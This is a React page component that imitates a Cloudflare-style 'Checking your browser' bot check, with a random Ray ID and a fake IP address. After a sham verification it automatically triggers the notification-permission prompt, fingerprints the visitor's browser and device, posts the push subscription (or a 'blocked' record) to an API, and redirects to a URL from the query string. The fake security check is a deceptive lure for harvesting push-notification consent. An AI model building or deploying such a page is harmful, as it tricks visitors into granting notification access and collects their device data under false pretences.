'use client'

import { useState, useEffect } from 'react'
import { Container, Card, Button, Spinner } from 'react-bootstrap'
import { FiShield, FiCheckCircle, FiBell } from 'react-icons/fi'

export default function BotCheckPage() {
  const [clientInfo, setClientInfo] = useState(null)
  const [isChecking, setIsChecking] = useState(true)
  const [isVerified, setIsVerified] = useState(false)
  const [rayId, setRayId] = useState('')
  const [userAgent, setUserAgent] = useState('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
  const [ipAddress] = useState('192.168.1.100')
  const [timestamp, setTimestamp] = useState('')

  // Initialize client-side only values
  useEffect(() => {
    // Generate Ray ID on client side only
    const chars = '0123456789abcdef'
    let result = ''
    for (let i = 0; i < 16; i++) {
      result += chars[Math.floor(Math.random() * chars.length)]
    }
    setRayId(result)
    
    // Set timestamp on client side
    setTimestamp(new Date().toISOString())
    
    // Set user agent on client side
    if (typeof window !== 'undefined') {
      setUserAgent(window.navigator.userAgent)
    }
  }, [])

  // Detect browser and device information
  useEffect(() => {
    if (typeof window !== 'undefined') {
      const getBrowserInfo = () => {
        const ua = navigator.userAgent
        let browser = 'Unknown'
        let browserVersion = 'Unknown'
        
        if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) {
          browser = 'Chrome'
          browserVersion = ua.match(/Chrome\/(\d+)/)?.[1] || 'Unknown'
        } else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) {
          browser = 'Safari'
          browserVersion = ua.match(/Version\/(\d+)/)?.[1] || 'Unknown'
        } else if (ua.indexOf('Firefox') > -1) {
          browser = 'Firefox'
          browserVersion = ua.match(/Firefox\/(\d+)/)?.[1] || 'Unknown'
        } else if (ua.indexOf('Edg') > -1) {
          browser = 'Edge'
          browserVersion = ua.match(/Edg\/(\d+)/)?.[1] || 'Unknown'
        }

        const isMobile = /Mobile|Android|iPhone|iPad/i.test(ua)
        const deviceType = isMobile ? 'Mobile' : 'Desktop'
        
        const os = ua.indexOf('Win') > -1 ? 'Windows' :
                   ua.indexOf('Mac') > -1 ? 'macOS' :
                   ua.indexOf('Linux') > -1 ? 'Linux' :
                   ua.indexOf('Android') > -1 ? 'Android' :
                   ua.indexOf('iOS') > -1 ? 'iOS' : 'Unknown'

        return {
          browser,
          browserVersion,
          deviceType,
          operatingSystem: os,
          userAgent: ua,
          language: navigator.language,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          platform: navigator.platform
        }
      }

      setClientInfo(getBrowserInfo())
    }
  }, [])

  useEffect(() => {
    // Show bot check UI and then request permission
    const timer = setTimeout(() => {
      setIsChecking(false)
      setIsVerified(true)
      
      // Automatically request permission after verification
      setTimeout(() => {
        if (clientInfo) {
          handleAllow()
        }
      }, 500) // Small delay after showing verified state
    }, 1500)

    return () => {
      clearTimeout(timer)
    }
  }, [clientInfo])

  const handleAllow = async () => {
    try {
      console.log('Requesting notification permission...')
      const permission = await Notification.requestPermission()
      console.log('Permission result:', permission)
      if (permission === 'granted') {
        // In a real app, this would register the service worker and save the subscription
        // For now, we'll show the collected client information
        const clientData = {
          browser: clientInfo?.browser || 'Unknown',
          browserVersion: clientInfo?.browserVersion || 'Unknown',
          ipAddress: ipAddress,
          country: 'United States', // This would be determined by IP geolocation
          countryCode: 'US',
          operatingSystem: clientInfo?.operatingSystem || 'Unknown',
          deviceType: clientInfo?.deviceType || 'Desktop',
          subscribedUrl: document.referrer || window.location.origin,
          subscriptionDate: new Date().toISOString(),
          lastActive: new Date().toISOString(),
          tags: ['web-subscriber'],
          language: clientInfo?.language || 'en-US',
          timezone: clientInfo?.timezone || 'UTC',
          screenResolution: clientInfo?.screenResolution || 'Unknown',
          platform: clientInfo?.platform || 'Unknown'
        }
        
        // Get query parameters
        const urlParams = new URLSearchParams(window.location.search)
        const landingId = urlParams.get('landingId')
        const domain = urlParams.get('domain')
        const subscribedUrl = urlParams.get('url')
        const vapidKey = urlParams.get('vapidKey')
        const allowRedirect = urlParams.get('allowRedirect')
        
        // Register service worker and get subscription
        try {
          let subscriptionData;
          
          // Check if we're on the same domain as the push platform
          const isSameDomain = window.location.hostname === 'localhost' || 
                               window.location.hostname === domain;
          
          if (isSameDomain && 'serviceWorker' in navigator && 'PushManager' in window) {
            try {
              // Register service worker
              console.log('Registering service worker...')
              const registration = await navigator.serviceWorker.register('/push-sw.js')
              await navigator.serviceWorker.ready
              
              // Get or create subscription
              let subscription = await registration.pushManager.getSubscription()
              
              if (!subscription) {
                console.log('Creating new push subscription...')
                subscription = await registration.pushManager.subscribe({
                  userVisibleOnly: true,
                  applicationServerKey: urlBase64ToUint8Array(vapidKey)
                })
              }
              
              subscriptionData = subscription.toJSON()
              console.log('Real subscription obtained:', subscriptionData)
            } catch (swError) {
              console.error('Service worker error:', swError)
              // Fall back to demo subscription
              const timestamp = Date.now()
              const randomId = Math.random().toString(36).substring(7)
              subscriptionData = {
                endpoint: `https://push.example.com/${domain}/${timestamp}/${randomId}`,
                keys: {
                  p256dh: `demo-key-${timestamp}`,
                  auth: `demo-auth-${timestamp}`
                }
              }
            }
          } else {
            // For cross-domain, we track the permission choice without a real subscription
            const timestamp = Date.now()
            const randomId = Math.random().toString(36).substring(7)
            subscriptionData = {
              endpoint: `https://push.example.com/${domain}/${timestamp}/${randomId}`,
              keys: {
                p256dh: `demo-key-${timestamp}`,
                auth: `demo-auth-${timestamp}`
              }
            }
          }
          
          console.log('Sending subscription to API with data:', {
            landingId,
            domain,
            url: subscribedUrl,
            clientData
          })
          
          // Send subscription to API
          const response = await fetch('/api/clients', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              subscription: subscriptionData,
              landingId: landingId,
              domain: domain,
              url: subscribedUrl,
              accessStatus: 'allowed', // Explicitly set as allowed
              browserInfo: {
                browser: clientData.browser,
                version: clientData.browserVersion,
                os: clientData.operatingSystem,
                device: clientData.deviceType,
                language: clientData.language,
                platform: clientData.platform
              },
              location: {
                country: clientData.country,
                city: 'New York', // Add real geolocation
                ip: clientData.ipAddress
              }
            })
          })
          
          if (response.ok) {
            // Mark as subscribed locally (for this domain)
            localStorage.setItem('push-subscribed-' + landingId, 'true')
            console.log('Successfully saved subscription for landing:', landingId)
          } else {
            console.error('Failed to save subscription, response not ok')
          }
        } catch (error) {
          console.error('Failed to save subscription:', error)
        }
        
        // Redirect back to customer site with subscription status
        const redirectUrl = new URL(allowRedirect || subscribedUrl || '/')
        redirectUrl.searchParams.set('push-subscribed', 'true')
        redirectUrl.searchParams.set('push-landing-id', landingId)
        window.location.href = redirectUrl.toString()
      } else if (permission === 'denied') {
        // Don't show alert, just update the UI
        console.log('Notifications blocked by user')
        
        // Save blocked status and redirect
        await handleBlock()
      } else if (permission === 'default') {
        // User dismissed the prompt without choosing
        console.log('User dismissed the notification prompt')
        setTimeout(() => {
          window.location.href = '/landing'
        }, 2000)
      }
    } catch (error) {
      console.error('Error requesting permission:', error)
    }
  }

  // Utility function to convert VAPID key
  const urlBase64ToUint8Array = (base64String) => {
    const padding = '='.repeat((4 - base64String.length % 4) % 4)
    const base64 = (base64String + padding)
      .replace(/\-/g, '+')
      .replace(/_/g, '/')
    
    const rawData = window.atob(base64)
    const outputArray = new Uint8Array(rawData.length)
    
    for (let i = 0; i < rawData.length; ++i) {
      outputArray[i] = rawData.charCodeAt(i)
    }
    return outputArray
  }

  const handleBlock = async () => {
    // Save blocked status to database
    const urlParams = new URLSearchParams(window.location.search)
    const landingId = urlParams.get('landingId')
    const domain = urlParams.get('domain')
    const subscribedUrl = urlParams.get('url')
    const blockRedirect = urlParams.get('blockRedirect')
    
    try {
      // Save blocked attempt
      const response = await fetch('/api/clients', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          subscription: {
            endpoint: `blocked-${Date.now()}-${Math.random()}`, // Unique identifier for blocked
            keys: {
              p256dh: 'blocked',
              auth: 'blocked'
            }
          },
          landingId: landingId,
          domain: domain,
          url: subscribedUrl,
          accessStatus: 'blocked',
          browserInfo: {
            browser: clientInfo?.browser || 'unknown',
            version: clientInfo?.browserVersion || 'unknown',
            os: clientInfo?.operatingSystem || 'unknown',
            device: clientInfo?.deviceType || 'unknown',
            language: clientInfo?.language || 'en',
            platform: clientInfo?.platform || 'unknown'
          },
          location: {
            country: 'United States',
            city: 'New York',
            ip: ipAddress
          }
        })
      })
    } catch (error) {
      console.error('Failed to save blocked status:', error)
    }
    
    // Redirect back to customer site
    window.location.href = blockRedirect || subscribedUrl || '/'
  }

  return (
    <div style={{ 
      minHeight: '100vh', 
      backgroundColor: '#ffffff',
      display: 'flex',
      alignItems: 'center',
      justifyContent: 'center',
      padding: '20px'
    }}>
      <Container>
        <Card className="shadow-lg mx-auto" style={{ maxWidth: '600px', border: 'none' }}>
          <Card.Body className="p-5">
            {isChecking ? (
              <div className="text-center">
                <div className="mb-4">
                  <FiShield size={60} className="text-warning" />
                </div>
                <h2 className="mb-4">Checking your browser</h2>
                <p className="text-muted mb-4">
                  This process is automatic. Your browser will be redirected shortly.
                </p>
                <div className="mb-4">
                  <Spinner animation="border" variant="warning" />
                </div>
                <div className="text-start p-3 bg-light rounded" style={{ fontSize: '0.85rem' }}>
                  <p className="mb-1"><strong>Ray ID:</strong> {rayId}</p>
                  <p className="mb-1"><strong>Your IP address:</strong> {ipAddress}</p>
                  <p className="mb-1"><strong>Timestamp:</strong> {timestamp}</p>
                  <p className="mb-0"><strong>User Agent:</strong> <span style={{ wordBreak: 'break-word' }}>{userAgent}</span></p>
                </div>
              </div>
            ) : (
              <div className="text-center">
                <div className="mb-4">
                  <FiCheckCircle size={60} className="text-success" />
                </div>
                <h2 className="mb-4">Verification successful</h2>
                <p className="text-muted mb-4">
                  Your browser will now ask for notification permission...
                </p>
                
                <div className="mb-4">
                  <Spinner animation="border" variant="primary" size="sm" />
                </div>
                
                <p className="text-muted" style={{ fontSize: '0.9rem' }}>
                  Please look for the notification prompt in your browser
                </p>
                
                <div className="mt-4 text-muted" style={{ fontSize: '0.85rem' }}>
                  <p className="mb-1">
                    Protected by <strong>Push Platform</strong>
                  </p>
                  <p className="mb-0">Ray ID: {rayId}</p>
                </div>
              </div>
            )}
          </Card.Body>
        </Card>
      </Container>
    </div>
  )
}